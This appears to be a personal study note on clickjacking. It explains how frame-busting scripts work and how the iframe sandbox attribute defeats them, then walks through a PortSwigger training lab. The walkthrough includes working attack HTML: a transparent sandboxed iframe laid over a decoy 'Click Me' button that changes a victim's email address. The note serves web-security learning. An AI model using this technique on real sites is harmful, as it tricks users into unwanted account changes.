- Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites.
- A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. "Frame busting" or "frame breaking" scripts are used in web browsers to protect against clickjacking
- These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript.

**These scripts can do the following things:**

1. Check if the current web page is the main or top window to ensure it's not embedded within another website.
2. Make all frames (parts of a webpage) visible to prevent hidden elements that can be used for clickjacking.
3. Prevent users from clicking on invisible frames, enhancing security.
4. Flag and notify the user if there's a potential clickjacking attack, so they are aware of the threat.

These scripts help safeguard users from deceptive actions on the web.

- Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers.
- If a website uses JavaScript-based frame busters to prevent clickjacking, they might not work if a user's browser has strict security settings or if the browser doesn't support JavaScript at all. In such cases, the frame-busting protection may be ineffective.
- Attackers can bypass frame busters by using the HTML5 iframe sandbox attribute, specifically with "allow-forms" or "allow-scripts" values while omitting "allow-top-navigation." This setup prevents the frame buster from detecting whether or not it is the top window, making it less effective in protecting against clickjacking.

```jsx
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.

## Steps to solve lab - 
### Title - Clickjacking with a frame buster script

**Desc** - This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that changes the users email address? 
To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

**Creds** - wiener:peter

1.  Log in to your account on the target website.
  ![[clickjacking2.png]]

2. Go to the exploit server and paste the following HTML template into the **Body** section:
```jsx
	<style>
		#target_website {
			position: relative;
			width: 600px;
			height: 600px;
			opacity: 0.1;
			z-index: 2;
			}
		#decoy_website {
			position: absolute;
			z-index: 1;
			top: 448px;
			left: 73px;
			}
	</style>
	<div id="decoy_website">
	Click Me
	</div>
	<iframe scrolling="no" id="target_website" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=carlos@gmail.com" sandbox="allow-forms" >
	</iframe>
```

4. Click **Store** and then **View exploit**.
5. Click on **Deliver exploit to victim** and the lab should be solved.
![[clickjacking3.png]]

**After clicking on view exploit, we got something as follows** - 
![[clickjacking4.png]]